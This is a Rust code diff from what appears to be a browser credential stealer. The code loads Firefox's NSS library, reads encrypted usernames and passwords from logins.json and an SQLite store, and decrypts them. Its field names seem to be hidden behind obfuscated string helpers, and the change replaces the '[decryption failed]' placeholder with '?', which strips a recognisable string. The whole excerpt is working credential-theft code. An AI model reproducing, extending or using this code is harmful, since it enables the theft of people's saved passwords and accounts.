@@ -156,9 +156,9 @@ fn extract_from_json(nss_lib: &libloading::Library, logins_path: &Path) -> Optio
         let enc_password = login[s_gck_enc_password()].as_str().unwrap_or("");
 
         let username = decrypt_nss_value(nss_lib, enc_username)
-            .unwrap_or_else(|| "[decryption failed]".to_string());
+            .unwrap_or_else(|| "?".to_string());
         let password = decrypt_nss_value(nss_lib, enc_password)
-            .unwrap_or_else(|| "[decryption failed]".to_string());
+            .unwrap_or_else(|| "?".to_string());
 
         {
             let fmt = s_cred_fmt();
@@ -192,7 +192,7 @@ fn extract_logins_from_sqlite(nss_lib: &libloading::Library, conn: &Connection) 
         let username = if !enc_username.is_empty() {
             let b64 = general_purpose::STANDARD.encode(&enc_username);
             decrypt_nss_value(nss_lib, &b64)
-                .unwrap_or_else(|| "[decryption failed]".to_string())
+                .unwrap_or_else(|| "?".to_string())
         } else {
             String::new()
         };
@@ -200,7 +200,7 @@ fn extract_logins_from_sqlite(nss_lib: &libloading::Library, conn: &Connection) 
         let password = if !enc_password.is_empty() {
             let b64 = general_purpose::STANDARD.encode(&enc_password);
             decrypt_nss_value(nss_lib, &b64)
-                .unwrap_or_else(|| "[decryption failed]".to_string())
+                .unwrap_or_else(|| "?".to_string())
         } else {
             String::new()
         };
